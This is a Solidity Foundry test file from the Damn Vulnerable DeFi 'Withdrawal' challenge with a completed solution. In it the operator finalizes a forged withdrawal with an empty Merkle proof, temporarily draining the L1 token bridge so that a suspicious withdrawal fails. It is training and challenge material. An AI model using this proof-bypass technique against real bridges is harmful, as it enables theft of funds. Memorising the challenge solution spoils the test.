// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        // Read the JSON to prepare data for finalization of withdrawal
        string memory root = vm.projectRoot();
        string memory path = string.concat(root, "/test/withdrawal/withdrawals.json");
        string memory json = vm.readFile(path);

        uint256[] memory noncesArray;
        address[] memory callersArray;
        address[] memory targetsArray;
        bytes[] memory dataArray;

        // Parse the topics form the JSON
        bytes memory noncesJson = vm.parseJson(json, "..topics[1]");
        noncesArray = abi.decode(noncesJson, (uint256[]));

        bytes memory callersJson = vm.parseJson(json, "..topics[2]");
        callersArray = abi.decode(callersJson, (address[]));

        bytes memory targetsJson = vm.parseJson(json, "..topics[3]");
        targetsArray = abi.decode(targetsJson, (address[]));

        // Parse data from JSON
        bytes memory dataJson = vm.parseJson(json, "..data");
        dataArray = abi.decode(dataJson, (bytes[]));

        vm.warp(block.timestamp + 8 days);

        for (uint256 i = 0; i < WITHDRAWALS_AMOUNT; i++) {
            // The function already handles the suspicious withdrawal
            _finalizeWithdrawal(noncesArray[i], callersArray[i], targetsArray[i], dataArray[i]);
        }
    }

    function _finalizeWithdrawal(uint256 nonce, address caller, address target, bytes memory eventData) private {
        (, uint256 timestamp, bytes memory messageData) = abi.decode(eventData, (bytes32, uint256, bytes));

        if (nonce == 2) {
            uint256 tokenAmount = l1TokenBridge.totalDeposits();
            _handleTokens(true, tokenAmount);
            l1Gateway.finalizeWithdrawal(nonce, caller, target, timestamp, messageData, new bytes32[](0));
            _handleTokens(false, tokenAmount);
            return;
        }

        l1Gateway.finalizeWithdrawal(nonce, caller, target, timestamp, messageData, new bytes32[](0));
    }

    function _handleTokens(bool op, uint256 tokenAmount) private {
        // Withdraw tokens to fail the suspicious withdrawal
        if (op) {
            bytes memory dataForL1Gateway = abi.encodeCall(
                L1Forwarder.forwardMessage,
                (
                    0,
                    address(l2Handler),
                    address(l1TokenBridge),
                    abi.encodeCall(TokenBridge.executeTokenWithdrawal, (address(player), tokenAmount))
                )
            );

            l1Gateway.finalizeWithdrawal(
                0,
                address(l2Handler),
                address(l1Forwarder),
                (block.timestamp - 8 days),
                dataForL1Gateway,
                new bytes32[](0)
            );
            return;
        }

        // Send tokens back to the bridge
        token.transfer(address(l1TokenBridge), tokenAmount);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
